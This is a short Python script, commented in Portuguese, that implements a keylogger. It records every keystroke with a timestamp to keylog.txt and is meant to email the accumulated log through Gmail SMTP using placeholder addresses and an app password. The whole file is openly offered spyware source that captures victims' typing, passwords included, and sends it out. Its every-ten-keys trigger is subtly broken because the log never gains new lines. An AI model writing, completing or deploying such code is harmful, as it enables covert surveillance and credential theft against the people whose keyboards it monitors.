from pynput import keyboard
import time
import smtplib
from email.mime.text import MIMEText

log_file = "keylog.txt"

# Função pra enviar o log por e-mail
def send_email(log_content):
    sender = "teuemail@gmail.com"  # Coloque teu e-mail aqui
    receiver = "teuemail@gmail.com"  # Pode ser o mesmo ou outro e-mail
    password = "tua_senha_de_app"  # Coloque tua senha de app do Gmail aqui

    msg = MIMEText(log_content)
    msg["Subject"] = "Relatório do Keylogger"
    msg["From"] = sender
    msg["To"] = receiver

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()  # Ativa criptografia
        server.login(sender, password)  # Faz login no Gmail
        server.sendmail(sender, receiver, msg.as_string())  # Envia o e-mail

# Função pra escrever no arquivo e enviar e-mail
def write_to_file(key):
    key_map = {
        keyboard.Key.space: "[ESPAÇO]",
        keyboard.Key.enter: "[ENTER]",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.tab: "[TAB]",
        keyboard.Key.shift: "[SHIFT]",
        keyboard.Key.ctrl: "[CTRL]",
        keyboard.Key.alt: "[ALT]",
        keyboard.Key.esc: "[ESC]"
    }
    key_str = key_map.get(key, str(key))  # Pega nome legível ou usa o original
    timestamp = time.strftime("%H:%M:%S")  # Hora atual
    log_entry = f"[{timestamp}] {key_str} "
    
    # Escreve no arquivo
    with open(log_file, "a") as file:
        file.write(log_entry)
    
    # Checa se é hora de enviar e-mail
    with open(log_file, "r") as file:
        lines = file.readlines()
        if len(lines) % 10 == 0:  # Envia a cada 10 teclas
            send_email("".join(lines))

# Função pra teclas pressionadas
def on_press(key):
    try:
        write_to_file(key.char)  # Caracteres normais
    except AttributeError:
        write_to_file(key)  # Teclas especiais

# Função pra teclas soltas (pra parar com Esc)
def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Para o keylogger

# Inicia o keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()